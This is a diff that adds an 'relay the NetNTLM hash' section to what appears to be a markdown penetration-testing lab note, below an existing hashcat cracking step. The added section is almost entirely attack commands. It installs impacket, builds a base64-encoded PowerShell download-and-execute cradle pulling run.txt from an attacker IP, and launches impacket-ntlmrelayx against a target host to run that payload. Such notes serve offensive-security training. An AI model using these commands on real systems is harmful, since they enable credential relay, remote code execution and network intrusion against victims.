@@ -49,3 +49,28 @@ We can crack the NetNTLM hash with hashcat
 ```
 kali@kali:~$ hashcat -m 5600 hash.txt dict.txt --force
 ```
+#### relay the NetNTLM hash
+First, we need to install impacket, and kali powershell
+```
+kali@kali:~$ sudo apt install python3-impacket
+kali@kali:~$ sudo apt -y install powershell
+```
+
+invoke kali powershell to create base64encoded payload command 
+
+```
+kali@kali:~$ pwsh
+PowerShell 7.0.
+
+PS /home/kali> $text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX"
+PS /home/kali> $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
+PS /home/kali> $EncodedText = [Convert]::ToBase64String($bytes)
+PS /home/kali> $EncodedText
+KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AC
+kALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAu
+```
+
+kick off netlm relay, and run our listener to catch the call back
+```
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc payload'
+```
